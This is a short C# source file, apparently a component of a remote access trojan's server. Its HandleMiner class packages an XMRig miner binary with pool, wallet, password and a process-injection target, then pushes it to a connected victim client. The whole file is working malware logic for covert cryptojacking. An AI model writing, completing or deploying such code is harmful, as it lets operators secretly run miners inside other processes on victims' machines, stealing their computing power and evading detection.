using System.IO;
using System.Threading;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet;

public class HandleMiner
{
	public void SendMiner(Clients client)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Packet").AsString = "xmr";
		msgPack.ForcePathObject("Command").AsString = "save";
		msgPack.ForcePathObject("Bin").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\xmrig.bin")));
		msgPack.ForcePathObject("Hash").AsString = GetHash.GetChecksum("Plugins\\xmrig.bin");
		msgPack.ForcePathObject("Pool").AsString = XmrSettings.Pool;
		msgPack.ForcePathObject("Wallet").AsString = XmrSettings.Wallet;
		msgPack.ForcePathObject("Pass").AsString = XmrSettings.Pass;
		msgPack.ForcePathObject("InjectTo").AsString = XmrSettings.InjectTo;
		ThreadPool.QueueUserWorkItem(client.Send, msgPack.Encode2Bytes());
	}
}
